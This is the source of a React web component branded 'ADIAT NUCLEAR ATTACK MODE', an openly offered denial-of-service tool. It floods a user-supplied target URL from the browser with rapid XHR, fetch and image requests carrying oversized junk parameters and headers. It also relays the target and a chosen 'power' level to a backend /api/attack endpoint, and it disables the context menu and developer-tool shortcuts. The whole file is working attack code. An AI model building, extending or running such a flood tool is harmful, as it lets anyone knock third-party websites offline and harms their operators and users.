"use client";

import React, { useState, useEffect, useRef } from 'react';

const NuclearAttackCommand = () => {
  const [isAttacking, setIsAttacking] = useState(false);
  const [strikeCount, setStrikeCount] = useState(0);
  const [attackMode, setAttackMode] = useState('DEVICE'); // DEVICE or SERVER
  const [attackPower, setAttackPower] = useState(100); // Power level for server mode
  const [targetUrl, setTargetUrl] = useState('http://');
  const [health, setHealth] = useState(100);
  const [ttd, setTtd] = useState(0);
  const [radiation, setRadiation] = useState("0MB");
  const [warningText, setWarningText] = useState('⚠️ WARNING: EXTREME POWER - TARGET WILL CRASH IN SECONDS ⚠️');

  const abortControllerRef = useRef<AbortController | null>(null);

  // Security Protocols
  useEffect(() => {
    if (typeof window !== "undefined") {
      const handleContextMenu = (e: MouseEvent) => e.preventDefault();
      const handleKeyDown = (e: KeyboardEvent) => {
        if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73) || (e.ctrlKey && e.keyCode === 85)) {
          e.preventDefault();
          return false;
        }
      };
      document.addEventListener('contextmenu', handleContextMenu);
      document.addEventListener('keydown', handleKeyDown);
      return () => {
        document.removeEventListener('contextmenu', handleContextMenu);
        document.removeEventListener('keydown', handleKeyDown);
      };
    }
  }, []);

  // --- DEVICE ATTACK (Frontend HTTP Flood) ---
  const runDeviceAttack = (url: string) => {
    for (let i = 0; i < 100; i++) {
      try {
        let xhr = new XMLHttpRequest();
        xhr.open('GET', `${url}?nuclear=${Math.random()}&payload=${'X'.repeat(5000)}`, true);
        xhr.timeout = 1;
        xhr.send();

        fetch(`${url}?atomic=${Math.random()}`, {
          mode: 'no-cors',
          cache: 'no-store',
          headers: { 'X-Nuclear': 'X'.repeat(10000) }
        }).catch(() => {});

        let img = new Image();
        img.src = `${url}/bomb_${Math.random()}?${'X'.repeat(2000)}`;
      } catch (e) {}
    }
  };

  // --- SERVER ATTACK (Calling Backend with Dynamic Power) ---
  const runServerAttack = async (url: string) => {
    try {
      await fetch('/api/attack', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          url: url, 
          power: attackPower 
        }), 
        signal: abortControllerRef.current?.signal,
      }).catch(() => {});
    } catch (e) {}
  };

  // Attack Loop
  useEffect(() => {
    let interval: any;

    if (isAttacking && targetUrl && targetUrl !== 'http://') {
      abortControllerRef.current = new AbortController();
      
      interval = setInterval(() => {
        if (attackMode === 'DEVICE') {
          runDeviceAttack(targetUrl);
          setStrikeCount(prev => prev + 150); 
        } else {
          // সার্ভার মোডে ব্যাকএন্ড লজিক অনুযায়ী লুপ চালানো
          for(let i=0; i<50; i++) { 
            runServerAttack(targetUrl); 
          }
          setStrikeCount(prev => prev + (attackPower === 500 ? 1000 : attackPower));
        }

        // Stats Update
        const rad = (strikeCount * 0.5).toFixed(0);
        setRadiation(Number(rad) > 999 ? (Number(rad) / 1000).toFixed(1) + 'GB' : rad + 'MB');
        const currentHealth = Math.max(0, 100 - Math.floor(strikeCount / 10000));
        setHealth(currentHealth);
        setTtd(Math.max(0, Math.floor(currentHealth / 10)));
        
        if (strikeCount > 100000) {
          setWarningText('💀 TARGET DESTROYED - MISSION COMPLETE 💀');
        } else {
          setWarningText(`☢️ ATTACK LEVEL: ${Math.min(100, Math.floor(strikeCount/1000))}% ☢️`);
        }
      }, 100);
    }

    return () => {
      if (interval) clearInterval(interval);
      if (abortControllerRef.current) abortControllerRef.current.abort();
    };
  }, [isAttacking, attackMode, targetUrl, strikeCount, attackPower]);

  const handleFire = () => {
    if (isAttacking) {
      emergencyStop();
      return;
    }
    if (!targetUrl.startsWith('http')) {
      alert('ERROR: URL অবশ্যই http:// বা https:// দিয়ে শুরু হতে হবে!');
      return;
    }
    setIsAttacking(true);
    setStrikeCount(0);
    setHealth(100);
  };

  const emergencyStop = () => {
    setIsAttacking(false);
    if (typeof window !== "undefined") window.stop();
  };

  return (
    <div className="flex justify-center items-center min-h-screen bg-black font-mono text-white select-none overflow-hidden p-4">
      <style dangerouslySetInnerHTML={{ __html: `
        @keyframes nuclearPulse {
          0% { border-color: #ff0000; box-shadow: 0 0 50px rgba(255,0,0,0.5); }
          50% { border-color: #00f7ff; box-shadow: 0 0 100px rgba(0, 247, 255, 0.7); }
          100% { border-color: #ff0000; box-shadow: 0 0 50px rgba(255,0,0,0.5); }
        }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        .attack-card { background: #1a0000; border: 2px solid #00e1ff; padding: 15px; text-align: center; cursor: pointer; transition: 0.3s; }
        .attack-card.selected { border: 3px solid #ff0000; background: #330000; box-shadow: 0 0 30px red; }
      `}} />
      
      <div className="w-[1100px] bg-[#0a0000] border-4 p-8 rounded-2xl relative" 
           style={{ animation: 'nuclearPulse 0.5s infinite' }}>
        
        <div className="text-center mb-8">
          <h1 className="text-5xl font-bold mb-2" style={{ color: '#00f7ff', textShadow: '0 0 20px #00f7ff' }}>💀 ADIAT NUCLEAR ATTACK MODE 💀</h1>
          <div className="text-[#00ffd5] text-xl font-bold" style={{ animation: 'blink 0.2s infinite' }}>
            {warningText}
          </div>
        </div>

        <div className="mb-6">
          <label className="block text-cyan-400 mb-2">🎯 TARGET URL</label>
          <input 
            type="text" 
            value={targetUrl} 
            onChange={(e) => setTargetUrl(e.target.value)}
            className="w-full p-4 bg-[#1a0000] border-2 border-red-900 text-red-500 text-xl font-bold outline-none focus:border-cyan-500"
          />
        </div>

        {/* Mode Switcher */}
        <div className="grid grid-cols-2 gap-4 mb-6">
          <div 
            onClick={() => setAttackMode('DEVICE')}
            className={`p-4 text-center cursor-pointer border-2 transition-all ${attackMode === 'DEVICE' ? 'border-red-500 bg-[#330000]' : 'border-cyan-500 bg-[#1a0000]'}`}
          >
            <h3 className="text-xl font-bold">🔥 DEVICE ATTACK</h3>
          </div>
          <div 
            onClick={() => setAttackMode('SERVER')}
            className={`p-4 text-center cursor-pointer border-2 transition-all ${attackMode === 'SERVER' ? 'border-red-500 bg-[#330000]' : 'border-cyan-500 bg-[#1a0000]'}`}
          >
            <h3 className="text-xl font-bold">🚀 SERVER ATTACK</h3>
          </div>
        </div>

        {/* Power Selection (Visible only for Server Mode) */}
        {attackMode === 'SERVER' && (
          <div className="grid grid-cols-4 gap-4 mb-8">
            {[ 
              { p: 100, t: '☢️ NUCLEAR HTTP' }, 
              { p: 200, t: '💀 ATOM TCP' }, 
              { p: 300, t: '⚡ HYDROGEN UDP' }, 
              { p: 500, t: '🌋 SUPER NOVA' } 
            ].map((card) => (
              <div 
                key={card.p} 
                className={`attack-card ${attackPower === card.p ? 'selected' : ''}`} 
                onClick={() => setAttackPower(card.p)}
              >
                <h4 className="font-bold">{card.t}</h4>
              </div>
            ))}
          </div>
        )}

        <div className="grid grid-cols-4 gap-4 mb-8">
          {[
            { label: 'STRIKES', value: strikeCount.toLocaleString() },
            { label: 'RADIATION', value: radiation + 'MB' },
            { label: 'HEALTH', value: health <= 0 ? '0% 💀' : `${health}%` },
            { label: 'TTD', value: health <= 0 ? 'DEAD' : `${ttd}s` }
          ].map((stat, i) => (
            <div key={i} className="bg-black border-2 border-red-900 p-4 text-center">
              <div className="text-xs text-gray-500 mb-1">{stat.label}</div>
              <div className="text-red-600 text-3xl font-bold" style={{ textShadow: '0 0 10px red' }}>{stat.value}</div>
            </div>
          ))}
        </div>

        <button 
          onClick={handleFire}
          className="w-full p-8 text-white text-3xl font-bold rounded-lg transition-transform active:scale-95"
          style={{ 
            background: 'linear-gradient(45deg, #660000, #ff0000)',
            boxShadow: isAttacking ? 'none' : '0 0 50px rgba(255,0,0,0.5)'
          }}
        >
          {isAttacking ? '💥 ATTACK IN PROGRESS 💥' : '💣 LAUNCH ATTACK 💣'}
        </button>

        <div className="text-center mt-6 text-red-900 font-bold cursor-pointer hover:text-red-500 transition-colors"
             onClick={emergencyStop}>
          ⚠️ EMERGENCY STOP ⚠️
        </div>
      </div>
    </div>
  );
};

export default NuclearAttackCommand;